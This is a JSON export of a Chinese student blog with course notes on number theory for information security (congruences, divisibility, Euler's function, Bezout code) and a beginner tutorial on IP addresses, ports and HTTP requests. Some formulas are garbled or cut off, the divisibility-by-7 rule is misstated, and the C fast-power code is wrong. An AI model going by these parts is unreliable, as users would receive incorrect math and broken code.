667)≡468(mod 667)","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"信息安全数学基础","slug":"课程学习/信息安全数学基础","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/tags/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://blog.keter.top/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}]},{"title":"「信息安全数学导论」同余","slug":"【信息安全数学导论】同余","date":"2021-06-30T06:01:02.000Z","updated":"2021-09-28T03:11:56.214Z","comments":true,"path":"2021/06/30/【信息安全数学导论】同余/","link":"","permalink":"http://blog.keter.top/2021/06/30/%E3%80%90%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%AF%BC%E8%AE%BA%E3%80%91%E5%90%8C%E4%BD%99/","excerpt":"¶第二章 同余 我感觉我已经快学到去世了，呜呜呜 ¶同余的定义 如果a - b 被 m 整除，或 m｜a - b，就记作 a≡b(mod n)a \\equiv b(mod\\ n)a≡b(mod n) 叫做a，b摸n同余。 a，b模n同余的意思翻译过来其实就是a-b可以被n整除； ¶同余的判断 如何判断两个数是否同余呢？`》 判断是否存在一个整数q使得： a=b+q⋅ma = b + q \\cdot ma=b+q⋅m 其一点从定义中就很容易的可以推出来； 模同余的等价关系（自反性，对称性，传递性）可以用来快速的判断a和b是否模m同余； （1）对于任意整数a 都有a≡a(mod m)a \\equiv a(mod\\ m)a≡a(mod m) （2）若 a≡b(mod n)a \\equiv b(mod \\ n)a≡b(mod n)；这个做题有时候还是会遇到的，需要注意一下； （3）若a≡b(mod m)a \\equiv b(mod \\ m)a≡b(mod m)","text":"¶第二章 同余 我感觉我已经快学到去世了，呜呜呜 ¶同余的定义 如果a - b 被 m 整除，或 m｜a - b，就记作 a≡b(mod n)a \\equiv b(mod\\ n)a≡b(mod n) 叫做a，b摸n同余。 a，b模n同余的意思翻译过来其实就是a-b可以被n整除； ¶同余的判断 如何判断两个数是否同余呢？`》 判断是否存在一个整数q使得： a=b+q⋅ma = b + q \\cdot ma=b+q⋅m 其一点从定义中就很容易的可以推出来； 模同余的等价关系（自反性，对称性，传递性）可以用来快速的判断a和b是否模m同余； （1）对于任意整数a 都有a≡a(mod m)a \\equiv a(mod\\ m)a≡a(mod m) （2）若 a≡b(mod n)a \\equiv b(mod \\ n)a≡b(mod n)；这个做题有时候还是会遇到的，需要注意一下； （3）若a≡b(mod m)a \\equiv b(mod \\ m)a≡b(mod m) 由最小非负余数来判断同余 a，b模m同余的充分必要条件是a，b被m除的余数相同；其实我感觉这条性质是最接近同余这个名字的了，同余同余，两个数的余数相同不就叫做同余吗？ 通过整数a，b模m的加法运算和乘法运算的性质来判断a，b模m是否同余 如果a1≡b1(mod m)a_1 \\equiv b_1(mod \\ m)a1​≡b1​(mod m) 则： （1）a1+a2≡b1+b2(mod m)a_1+a_2 \\equiv b_1 + b_2(mod \\ m)a1​+a2​≡b1​+b2​(mod m) （2）a1⋅a2≡b1⋅b2(mod m)a_1 \\cdot a_2 \\equiv b_1 \\cdot b_2(mod \\ m)a1​⋅a2​≡b1​⋅b2​(mod m) 如何便捷的判断n是 否可以被3或者9整除？（可以用于判断大数时候可以被3和9整除） 假设 m 是 n 各位数字的合，则： （i）3｜n的充分必要条件是`》3 ｜ m （ii）9｜n的充分必要条件是=〉 9｜m 如何便捷的判断大数能否被11、13、7整除？ 7可以整除n的充分必要条件就是7可以整除整数: (a0+a2+⋅⋅⋅)−(a1+a3+⋅⋅⋅)(a_0+a_2+ \\cdot \\cdot \\cdot)-(a_1 + a_3 + \\cdot \\cdot \\cdot) (a0​+a2​+⋅⋅⋅)−(a1​+a3​+⋅⋅⋅) a0−ana_0 - a_na0​−an​就是数字n各位上的数字； ¶同余的性质 设m是一个正整数，设d⋅a≡d⋅b(mod m)d \\cdot a \\equiv d \\cdot b(mod \\ m)d⋅a≡d⋅b(mod m). 如果(d,m) = 1即d和m互素，则 a≡b(mod m)a \\equiv b(mod \\ m) a≡b(mod m) 这一点类似于同余的消去律？ 还有一条类似的性质：设a≡b(mod m)a \\equiv b(mod \\ m)a≡b(mod m),则 ad≡bd(mod md)\\frac{a}{d} \\equiv \\frac{b}{d}(mod \\ \\frac{m}{d}) da​≡db​(mod dm​) 如果a，b关于mim_imi​（i从1到k）同余，那么a，b关于这一堆数的最大公倍数n同余； 设a≡b(mod p⋅q)a \\equiv b(mod \\ p \\cdot q)a≡b(mod p⋅q),则： (a,m)=(b,m)(a,m)=(b,m) (a,m)=(b,m) 如果 a≡b(mod c)a \\equiv b (mod \\ c)a≡b(mod c)，则： a≡b(mod [c,d])a \\equiv b(mod \\ [c,d]) a≡b(mod [c,d]) ¶剩余类和完全剩余系 ¶剩余类和剩余 由于同余是一种等价关系，对于整数m，可以把所有的整数分成m类，每一类对于m都同余；每一类都叫做m的一个剩余类；一般用CaC_aCa​是非空集合； 可以发现剩余类其实就是等价关系中的一个等价类；又扯到离散上去了，裂开； 设m是一个正整数，则 任何一个整数包含在一个CrC_rCr​ Ca=CbC_a = C_bCa​=Cb​ Ca与CbC_a与C_bCa​与Cb​ 一个剩余类中的任一个数都叫做该类的剩余，或者代表元 ¶完全剩余系 对于一个数m，现在有m个数，每一个都来自于不同的剩余类，那么这m个数就叫做模m的一个剩余系；记作Z/mZZ/mZZ/mZ m个整数构成一个完全剩余系的条件：其实在定义中也就可以发现了，m个整数r0,r1,r2,⋅⋅⋅,rm−1r_0,r_1,r_2, \\cdot \\cdot \\cdot ,r_{m-1}r0​,r1​,r2​,⋅⋅⋅,rm−1​为模m的一个完成剩余系的充分必要条件是他们模m两两不同余； 设m是正整数，a是满足（a，m）=1的整数，b是任意整数，若k遍历模m的一个完全剩余系，则：a⋅k+ba \\cdot k+ ba⋅k+b 也遍历模m的一个完全剩余系； 完全剩余系的加法原则？ 如果k1,k2k_1,k_2k1​,k2​的完全剩余系. 这条规则还可以拓展到多个模的情况； ¶简化剩余类与欧拉函数 ¶欧拉函数 一个正整数m，1到m-1中与m互素的整数的个数记作ϕ(x)\\phi(x)ϕ(x),通常叫做欧拉函数； 一个素数p，ϕ(p)=p−1\\phi(p)=p-1ϕ(p)=p−1 对于素数幂m=pαm=p^{\\alpha}m=pα ¶简化剩余类 如果剩余类中存在一个剩余与m互素，那么这个剩余类就叫做简化剩余类，简化剩余类中的剩余叫做简化剩余； 简化剩余类的这个定义与剩余的选取无关； 两个简化剩余的乘积仍然是简化剩余； 类比剩余系的概念，我们可以理解简化剩余系，∣(Z/mZ)∗∣=ϕ(m)|(Z/mZ)^*|=\\phi(m)∣(Z/mZ)∗∣=ϕ(m) 设m是一个整数数，若r1,r2,⋅⋅⋅rϕ(m)r_1,r_2, \\cdot \\cdot \\cdot r_{\\phi(m)}r1​,r2​,⋅⋅⋅rϕ(m)​是模m的一个简化剩余系。 对于正整数m，若整数a满足(a,m)=1,如果k遍历模m的一个简化剩余系则a⋅ka \\cdot ka⋅k也遍历模m的一个简化剩余系。 对于正整数m，a是满足(a,m)=1的整数，则存在唯一的整数a‘，1 &lt;= a’ &lt; m 使得： a⋅a′≡1(mod m) a \\cdot a&#x27; \\equiv 1(mod \\ m) a⋅a′≡1(mod m) a’就叫做模m的逆元； 两个模的简化剩余系： 设m1，m2是互素的两个正整数，如果k1，k2分别遍历模m1和模m2的简化剩余系，则： $m_2 \\cdot k_1 + m_1 \\cdot k_2 遍历模 遍历模遍历模m_1 \\cdot m_2$的简化剩余系. ¶欧拉函数的性质 ¶如何快速的求出欧拉函数值？ 设m，n是互素的两个正整数，则 ϕ(m⋅n)=ϕ(m)⋅ϕ(n)\\phi(m \\cdot n)=\\phi(m) \\cdot \\phi(n) ϕ(m⋅n)=ϕ(m)⋅ϕ(n) 而且这个公式可以无限套娃，也就是说ϕ(m)和ϕ(n)\\phi(m)和\\phi(n)ϕ(m)和ϕ(n)还可以继续往下分； 幂次方的乘积应该如何求它的欧拉函数呢？ m=p1α1⋅⋅⋅p2αsm =p_1^{\\alpha_1} \\cdot \\cdot \\cdot p_2^{\\alpha_s } m=p1α1​​⋅⋅⋅p2αs​​ 则： ϕ(x)=m(1−1p1)⋅⋅⋅(1−1pk)\\phi(x) = m(1-\\frac{1}{p_1}) \\cdot \\cdot \\cdot (1-\\frac{1}{p_k}) ϕ(x)=m(1−p1​1​)⋅⋅⋅(1−pk​1​) 设p，q是不同的素数，则 ϕ(p⋅q)=p⋅q−p−q+1\\phi(p \\cdot q) = p \\cdot q - p -q +1 ϕ(p⋅q)=p⋅q−p−q+1 ¶欧拉定理、费马小定理和Wilson定理 ¶欧拉定理 设m数大于1的整数，如果是a满足（a，m）= 1的整数，则 aϕ(m)≡1(mod m)a^{\\phi(m)} \\equiv 1(mod \\ m) aϕ(m)≡1(mod m) ¶费马小定理 研究模m=p为素数时候，整数ak(mod p)a^k(mod \\ p)ak(mod p)的性质. 设p是一个素数，则对任意整数a，有 ap≡a(mod p)a^p \\equiv a(mod \\ p) ap≡a(mod p) 应用：当p为素数的时候，费马小定理可以快速的求出a (mod p) ¶Wilson定理 设p是一个素数，则 (p−1)!≡−1(mod p)(p-1)! \\equiv -1(mod \\ p)(p−1)!≡−1(mod p) 看到数字连乘的时候可以考虑使用Wilson定理 ¶模重复平方法 用于求大数平方的模 12345678910111213141516&quot;&quot;&quot;模重复平方法&quot;&quot;&quot;# 求解一个数的n次方的模# 比如12996的227次方模37909同余的结果a = 1num = 12996n = 227c = 37909while n: if n % 2 == 1: a = a * num % c num = (num ** 2) % c n //= 2print(a) ¶重要知识点： ¶判断两个数是否同余？ 根据定理：m｜(a-b) ,则a≡(mod m)a \\equiv (mod \\ m)a≡(mod m) a≡b(mod m)a \\equiv b(mod \\ m)a≡b(mod m) a,b对于m除的余数相同； ¶判断一个数n能否被3，7，9，11，13整除 =&gt; P57 （1）对于3和9 将n转化为10进制的科学记数法，n=ak⋅10k+...+a0n=a_k \\cdot 10^k + ... + a_0n=ak​⋅10k+...+a0​ （i）3｜n的充分必要条件是`》3 ｜ aia_iai​ （ii）9｜n的充分必要条件是=〉 9｜aia_iai​ （2）如何便捷的判断大数能否被11、13、7整除？ 7可以整除n的充分必要条件就是7可以整除整数: (a0+a2+⋅⋅⋅)−(a1+a3+⋅⋅⋅)(a_0+a_2+ \\cdot \\cdot \\cdot)-(a_1 + a_3 + \\cdot \\cdot \\cdot)(a0​+a2​+⋅⋅⋅)−(a1​+a3​+⋅⋅⋅) a0−ana_0 - a_na0​−an​就是数字n各位上的数字； ¶如何求模m的完全剩余系？ ==&gt; P64 （1）直接取得0，…，m-1即是一个完全剩余系 （2）对于从0到m-1的这个完全剩余系，可以对于某部分数再加上m的倍数; （3）如果已知一个完全剩余系kik_iki​也是一个完全剩余系 （4）如果m1⋅m2=mm_1 \\cdot m_2 = mm1​⋅m2​=m则遍历模m的完全剩余系； ¶如何求一个数的欧拉函数？ ==&gt; P70 (1)设m，n是互素的两个正整数，则 ϕ(m⋅n)=ϕ(m)⋅ϕ(n)\\phi(m \\cdot n)=\\phi(m) \\cdot \\phi(n) ϕ(m⋅n)=ϕ(m)⋅ϕ(n) 而且这个公式可以无限套娃，也就是说ϕ(m)和ϕ(n)\\phi(m)和\\phi(n)ϕ(m)和ϕ(n)还可以继续往下分； (2)对于任意的整数m： ϕ(m)=m⋅(1−1p1)(1−1p2)⋅⋅⋅\\phi(m)=m \\cdot (1-\\frac{1}{p_1})(1-\\frac{1}{p_2}) \\cdot \\cdot \\cdot ϕ(m)=m⋅(1−p1​1​)(1−p2​1​)⋅⋅⋅ p的来源是标准分解式 ==&gt; P70 ¶如何求模m的简化剩余系 ==&gt; P70 (1) 按照定义来，在最小非负完全剩余系中暴力判断每一个代表元是否与m互素，是的话保存；最后剩的就是一个最为简单的简化剩余系 (2) 同求完全剩余的第（3），如若已知kik_iki​也遍历模m的一个简化剩余系 (3) 同求完全剩余的第（4），如果m1⋅m2=mm_1 \\cdot m_2 = mm1​⋅m2​=m则遍历模m的简化剩余系； (4) 如若a是模m的原根，则m的简化剩余系就是a0,a1,...,aϕ(m)−1a^0,a^1,...,a^{\\phi(m)-1}a0,a1,...,aϕ(m)−1 P169 ¶如何快速计算bnb^nbn P80 采用模重复平凡计算法（也叫快速幂 ACM经典算法）： 对于bnb^nbn次，时间复杂度大大减少； C实现： 123456789int fastpow(int base,int n,int mod)&#123; int ans=1; while(n)&#123; if(n&amp;1) ans*=base%mod; base*=base; n&gt;&gt;=1; &#125; return ans%mod;&#125; ¶如何求解一个数的逆元？ 枚举法：对于比较小的数可以通过肉眼 “看” 的方式直接口算出他的逆元 费马小定理：如果m为素数则逆元可以表达为：am−2 mod ma^{m-2} \\ mod \\ mam−2 mod m 拓展欧几里得算法： x是a的逆元可以表示为：ax=1(mod n)ax=1(mod \\ n)ax=1(mod n) ； 然后可以得到：ax−ny=1ax-ny = 1ax−ny=1; 之后运用拓展欧几里得算法求得：ax+ny=1ax+ny=1ax+ny=1的解即可 注意逆元存在的条件为（a，n）= 1","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"信息安全数学基础","slug":"课程学习/信息安全数学基础","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/tags/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://blog.keter.top/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}]},{"title":"「信息安全数学导论」整除","slug":"【信息安全数学导论】整除","date":"2021-06-30T06:01:02.000Z","updated":"2021-08-17T09:00:56.000Z","comments":true,"path":"2021/06/30/【信息安全数学导论】整除/","link":"","permalink":"http://blog.keter.top/2021/06/30/%E3%80%90%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%AF%BC%E8%AE%BA%E3%80%91%E6%95%B4%E9%99%A4/","excerpt":"¶整除的可能性 我也不知道应该怎么整理这个笔记，先整理着试一试吧 ¶整除的一些概念 b整除a记作 b∣ab|ab∣a 当b遍历整数a的所有因子时，-b和ab\\frac{a}{b}ba​也遍历a的所有因数 特殊数字的整除： 0是任何非零整数的倍数 1是任何整数的因数 任何非零整数a数其自身的倍数，也是其自身的因数 整除具有传递性：","text":"¶整除的可能性 我也不知道应该怎么整理这个笔记，先整理着试一试吧 ¶整除的一些概念 b整除a记作 b∣ab|ab∣a 当b遍历整数a的所有因子时，-b和ab\\frac{a}{b}ba​也遍历a的所有因数 特殊数字的整除： 0是任何非零整数的倍数 1是任何整数的因数 任何非零整数a数其自身的倍数，也是其自身的因数 整除具有传递性： 若 b∣a，c∣bb\\mid a ，c\\mid bb∣a，c∣b 整除的性质在加法和减法运算以及线性组合中都是可以保持 若 c∣a,c∣bc | a,c|bc∣a,c∣b 被 c 整除 这个整数也可以被推广到多个整数的线性组合 如果两个数互相整除，那么这两个数不是相等就是互为相反数 素数 总是正整数 从了1和自身没有一个数再能整除它了 如何快速的找到素数？==》 平凡除法 / 厄拉托赛师（Eratosthenes）算法 素数有无穷多个 欧几里得除法——最小非负余数 设a,b是两个整数，其中b&gt;0，则存在唯一的整数q和r使得a=q⋅b+r,0&lt;r&lt;ba = q \\cdot b + r, 0 &lt; r &lt; ba=q⋅b+r,0&lt;r&lt;b，q叫做a被b除所得的不完全商 最大公因子与广义欧几里德除法 最大公因数：因数中最大的一个，a和b的最大公因数记作（a，b） 一堆不全为0的数的公因数与这堆数加上绝对值后的公因数相同 Bezout等式的计算 ==》太难说明了，结合矩阵图理解吧 广义欧几里得算法：简单的来说就是当两个数比较大的时候来求这两个数的最大公因子，时间复杂度为O(n) 123456789101112131415161718192021222324252627282930313233343536373839404142434445&quot;&quot;&quot;贝祖公式的实现&quot;&quot;&quot;import mathj = []s_j = []t_j = []q_j_1 = []r_j_1 = []# 规定a和ba = 3589b = 1613temp_a = atemp_b = b# 先求r_j_1和q_j_1r_j_1.append(temp_a)r_j_1.append(temp_b)while temp_a % temp_b != 0: # 向下取整 q = math.floor(temp_a / temp_b) q_j_1.append(q) r_j_1.append(temp_a - temp_b * q) temp = temp_b temp_b = temp_a - temp_b * q temp_a = temp# r_j_1.append(0)# q_j_1.append(math.floor(a / b))# 求s_j 和 t_j q12# 初始化s_j 和 t_js_j.append(1)t_j.append(0)s_j.append(0)t_j.append(1)for i in range(len(q_j_1)): s_j.append(-q_j_1[i] * s_j[i + 1] + s_j[i]) t_j.append(-q_j_1[i] * t_j[i + 1] + t_j[i])print(r_j_1)print(q_j_1)print(s_j)print(t_j)print(s_j[-1] * a + t_j[-1] * b) 最大公因子进一步的性质 如何找到两个较小的互素的整数，或者说如何构造互素的整数 (a(a⋅b),b(a,b))=1(\\frac{a}{(a \\cdot b)},\\frac{b}{(a,b)}) = 1 ((a⋅b)a​,(a,b)b​)=1 m为任意个正整数，则m⋅a,m⋅b=m⋅(a⋅b)m \\cdot a,m \\cdot b = m \\cdot (a \\cdot b)m⋅a,m⋅b=m⋅(a⋅b) 若非零整数d满足，d｜a且d｜b，则 (ad,bd)=(a,b)∣d∣(\\frac{a}{d},\\frac{b}{d}) = \\frac{(a,b)}{|d|} (da​,db​)=∣d∣(a,b)​ 设a，b，c是三个整数，且b≠0,c≠0b \\neq 0,c \\neq 0b​=0,c​=0 如果 （a，c）= 1 则 (ab,c)=(b,c)(ab,c) = (b,c) (ab,c)=(b,c) 如果c和一组数中的每一个数都互素，则它和这一组数的乘积也互素 设a，b，u，v都是不全为0的整数，如果 a=q⋅u+r⋅v,b=s⋅+t⋅v,a = q \\cdot u + r \\cdot v,b=s \\cdot + t \\cdot v, a=q⋅u+r⋅v,b=s⋅+t⋅v, 其中q, r , s, t是整数，且q⋅t−r⋅s=1q \\cdot t - r \\cdot s = 1q⋅t−r⋅s=1，则(a,b) = (u,v) 如果计算多个数的最大公因数？ == 》 两个两个算即可 2α−12^\\alpha-12α−1的整数及其最大公因数 设a和b是两个正整数，则2a−1和2b−1除的最小非负余数是2r−1,其中r是a被b除的最小非负余数2^a-1和2^b-1除的最小非负余数是2^r-1,其中r是a被b除的最小非负余数2a−1和2b−1除的最小非负余数是2r−1,其中r是a被b除的最小非负余数 2a−1和2b−1的最大公因数是2(a,b)−12^a-1和2^b-1的最大公因数是2^{(a,b)}-12a−1和2b−1的最大公因数是2(a,b)−1 整除的进一步性质 如果 c ｜ ab，（a，c）=1，则c｜b。其实很好理解因为a和c的最大公因子为1了，就可以推出来c一定是可以整出b的。 如果 p ｜ab 则 p｜a 或 p｜b ，这个也是比较明显的 最小公倍数 a和b的最小公倍数记作 [a,b][a,b][a,b] 若a｜D，b｜D，则[a,b] | D; 最小公倍数的一种计算方法（最小公倍数与最大公因数的关系）：[a,b]=a⋅b(ab˙)[a,b] = \\frac{a \\cdot b}{(a \\dot b)}[a,b]=(ab˙)a⋅b​ 如何计算多个最小公倍数？==》 两个两个计算 整数分解 整数分解定理 ¶重要知识点 ¶如何证明一个数是素数： 用Eratosthenes筛法（平凡判别P7） 具体：对于一个数n，所有p&lt;n1/2p&lt; n^{1/2}p&lt;n1/2，均无法整除n，则n是一个素数 其欧拉函数即 φ(m)=m−1φ(m)=m−1φ(m)=m−1的时候，m是一个素数 P68 对于模m的最小正数完全剩余系等于其最小正数简化剩余系的时候，m是一个素数 利用Wilson定理，如果一个整数n，(n−1)!+1≡0(mod n)(n-1)!+1 \\equiv 0 (mod \\ n)(n−1)!+1≡0(mod n)时，n是一个素数 P118 ¶N的B进制的表示： P9 N=Ak−1Bk−1+......+A1B+A0N = A_{k-1}B_{k-1}+......+A_1B+A_0 N=Ak−1​Bk−1​+......+A1​B+A0​ ¶如何确定一个整数d是an......a0a_n ...... a_0an​......a0​的最大公因数： P20 （1）d∣an,d∣an−1...,d∣a0d|a_n,d|a_{n-1}...,d|a_0d∣an​,d∣an−1​...,d∣a0​ （2）对于一个数e，若e∣an...e∣a0e|a_n ... e|a_0e∣an​...e∣a0​则e|d; ¶如何计算两个数的最大公因数？ ¶1.广义欧几里得除法： P22 利用（a，b）=（b，c），一步一步的缩小 ¶2.贝祖公式 P25 🌿 贝祖等式：sa+tb=（a，b） 证明在 P27 如何求s和t？ 上面已经给出了Python代码的实现； ¶3. 如果形式为(2a−1,2b−1)(2^a-1,2^b-1)(2a−1,2b−1) 其最大公因数为2(a,b)−12^{(a,b)}-12(a,b)−1 ,P37 ¶4. 如果知道最小公倍数 P39 (a,b)=a⋅b[a,b](a,b)=\\frac{a \\cdot b}{[a,b]} (a,b)=[a,b]a⋅b​ ¶如何确定一个整数D是a1...ana_1 ... a_na1​...an​的最小公倍数？ P39 （1）ai∣Da_i | Dai​∣D （2）若ai∣D′a_i|D&#x27;ai​∣D′,则D｜D’ ¶如何构造两个互素的数？ 利用基础性质 (a(a.b),ba.b)=1(\\frac{a}{(a.b)},\\frac{b}{a.b})=1 ((a.b)a​,a.bb​)=1 构造一个ad-bc=1 则(a , b) = 1 通过一个已知的（u，v）= 1构造出（a，b）= 1 P35 (ab)=(qrst)(uv)\\begin{gathered} \\begin{pmatrix} a \\\\ b \\end{pmatrix} = \\begin{pmatrix} q &amp; r \\\\ s &amp; t \\end{pmatrix}\\begin{pmatrix} u \\\\ v \\end{pmatrix} \\end{gathered} (ab​)=(qs​rt​)(uv​)​ qt - sr = 1，可以得到，a = qu + rv；b = su + tv； 对于已知的（a，b）= 1，(2a−1,2b−1)=1(2^a - 1,2^b - 1)=1(2a−1,2b−1)=1 P37","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"信息安全数学基础","slug":"课程学习/信息安全数学基础","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/tags/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://blog.keter.top/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}]},{"title":"【前后端教程】打比赛必备的前后端知识","slug":"【前后端教程】打比赛必备的前后端知识","date":"2021-06-30T06:01:02.000Z","updated":"2021-08-13T13:47:27.000Z","comments":true,"path":"2021/06/30/【前后端教程】打比赛必备的前后端知识/","link":"","permalink":"http://blog.keter.top/2021/06/30/%E3%80%90%E5%89%8D%E5%90%8E%E7%AB%AF%E6%95%99%E7%A8%8B%E3%80%91%E6%89%93%E6%AF%94%E8%B5%9B%E5%BF%85%E5%A4%87%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E7%9F%A5%E8%AF%86/","excerpt":"","text":"基础网络通信知识 ¶浏览器是如何获取数据的？ 当我们打开一个网站的时候，网站上显示文字、图片等信息。有没有想过这些信息是如何被加载出来的呢？说的简单一些就是这些信息是从网络上“下载”下来的； ¶网站基础知识 一个网站是由一个前端和一个后端组成的，前端就是我们平时使用的浏览器所展现的网页。后端是负责提供应用服务的程序。一般负责和数据库的交互以及业务的逻辑处理。 前端是数据就是问后端要的，后端将数据返回给前端。前端再将数据呈现到你的面前； ¶网址结构解析 网页地址也叫做：url； 以bilibili的url举例子： 其中https表示使用的协议类型，https也就是http+ssl。http为超文本传输协议，ssl为一种加密协议。这些协议有兴趣可以去多了解了解，了解的不是那么深入问题也很大。你可以简单的理解为前缀了一个http/https就相当于说明了我想要的是超文本传输协议的服务。那如果是前缀ftp我想要的就是ftp文件传输的服务。他的作用就是用来表明你现在想要的服务是什么样的。就比如再看后面的黄色的部分www.bilibili.com这是bilibili网站的域名。域名就是给网站主机的IP地址起一个名字，这个域名就对应着一个IP地址。当然了我们还能看到另一种网址是由协议和IP地址组成的。 这种就是协议加ip地址的方式。刚才一直说IP地址，可能有的同学还是不是那么的了解IP地址。下面我们就介绍一下什么是IP地址。 ¶什么是IP地址？ 推荐学习网址：https://blog.csdn.net/python_LC_nohtyp/article/details/108919428?spm=1001.2014.3001.5501 简单的来说IP地址是主机在网络之间用于表明自己身份的东西。他们就像是快递的收件地址一样，数据包根据IP地址来送“快递”。当然了数据包送达的过程肯定没有那么简单，这里只是为了帮助你更好的了解IP地址。 ¶IP地址的基本结构 IP地址一般是由4个0-255的数组成的，比如127.0.0.1这就是一个IP地址。你可以在命令行上查看自己电脑的IP地址： 123Windows: ipconfigLinux: ifconfigMacOS: ifconfig | grep &quot;inet&quot; 可以知道10.33.0.185就是我这台电脑的IP地址； ¶公网IP与私网IP 私网IP是不会出现在互联网上的，无法直接使用它们来访问互联网，而只能在本地连接也就是局域网中使用。 公网IP能直接连接上网络，所以对于那些住宅小区，公司，学校，政府机构等场所，就可以集中使用私有的IP进行管理，而大家可以共用一个IP去连接上公网。为什么要区分公网和私网呢？ 因为ipv4的ip是非常有限的，如果给每一个电脑都分配一个ip地址那么势必是不够用的。所以想要的一个方法就是比如一个公司里面有非常多的机器，对于公司内的主机他们使用私网IP即可。当他们需要访问公网中的机器时，对外表现的IP地址则为这个公司的公网IP。每一个内网是相互独立的，这意味着不同内网中可以有相同的IP地址。这样就可以避免给每个主机都分配一个公网IP而导致的资源浪费和消耗过快的问题。 ¶IP和域名是什么关系？ 我们可以看到我们平时访问的网址都是https://www.baidu.com, 这样的网址；其中www.baidu.com叫做域名，那么域名和IP到底有什么关系呢？ 你可以理解域名就是IP的小名，为了方便记忆一个网站的网址的。你总不想记一大堆的全是数字的网址吧。 ¶Web开发中的路由？ 在web开发中，“route”是指根据url分配到对应的处理程序。他的表现方式类似于这样： https://zhidao.baidu.com/question/18364215.html 可以看到https://zhidao.baidu.com主url，后面跟着的/question/18364215.html就是路由了。你可以用函数封装的概念去理解路由。比如B站，我想访问动漫的那我就访问可以返回动漫数据的url:https://www.bilibili.com/v/douga，如果我想访问游戏的那我就访问可以返回游戏数据的url：https://www.bilibili.com/v/game。 ¶什么是数据包？ 前面已经说到了，前后端之间是要进行相互通信的，IP地址决定了数据包去往哪个地方，现在我们应该知道数据包到底是如何进行传输的。打开Chrome，按F12打开控制台进入到Network当中，按Ctrl+R刷新一下网页就可以看到网页加载时候所传输的所有数据包了。 我们把发送数据包的这个过程叫做请求，一般请求有两种方式分别的GET和POST. 两种请求也很好理解： GET就是获取的意思。前端向后端要数据的时候一遍使用GET请求。比如我需要获取一张图片，我就可以通过get的方式去获取这张图片。 POST是发送的意思，前端想要往后端发送的时候一般使用POST请求。比如我在登录的时候输入了账号密码，我需要把账号和密码发送到后端去做验证。 网站前后端的通信就是使用数据包进行通信的。 ¶端口 有网站开发经验的同学肯定对端口有一定的了解。我们经常说把一个网站跑在8000端口或者跑在某某端口上。如果我们在8000端口上跑了一个网页也就是说我们在8000端口上提供了一个网页的服务。每个端口都可以提供一个服务。 就好比你去商场，不同的店会给你不同的服务。端口就好比一家家的店，有的是卖衣服的，有的是卖电脑的等等。不同的店面给你不一样的服务。当然一个端口也只能提供一个服务，已经被占用的端口就不能给其他的服务使用了。 下图为我试图在22端口开启一个网页服务，代码会报错提示端口已被占用； 端口也有给数据包指路的作用，比如现在我像一个服务器上发送了一个HTTP数据包，但是呢这个服务器上跑了多个网页服务。我这个HTTP数据包到底应该送给谁呢？这时候端口的作用就来了，数据包中会包含目标的端口信息，根据端口信息就可以知道我这个数据包到底是发给哪一个后端服务的了。 ¶熟知端口 熟知端口就是系统中默认会用到的一些端口。你们应该也是有所了解了比如SSH服务的默认端口是22，FTP文件传输协议的端口是21，HTTP的默认端口就是80端口，HTTPS的默认端口就是443。下表是一些常见的端口。 前面已经说到了，一个端口只能提供一个服务，所以我们在创建自己的服务的时候一般都选择3000以后的端口，否则可能会和系统内的某些服务冲突。 ¶一些小问号 说到这里，你们应该知道一部分网站中的计算机网络知识了。如果想做一个简单的小网站的话这些知识应该够用了（大概）。想要更加详细了解的肯定要自己去多了解了解，毕竟我这里甚至连“三次握手，四次挥手”都没有讲。这些知识只是带你们大致的了解通信的过程。 下面通过一些问题的方式回顾一下上面的知识： 网站的基本组成部分是什么？每个部分负责什么功能？ 简单的来说，网站由前端和后端组成。前端负责将后端的数据呈现给用户和将用户的操作行为提交给后端。后端负责处理前端返回的数据。 为什么要区分公网IP和私网IP 因为IPv4的数量是非常有限的，如果给每一台机器分配的IP都是未知那么世界上的IP地址早都不够用了，于是人们想到一个办法就是把IP中的一部分IP腾出来作为私有IP而不作为公网IP。在一个子网中使用私有IP，这样不同的子网之中IP就可以是重复的了，大大增加了IP的利用率。 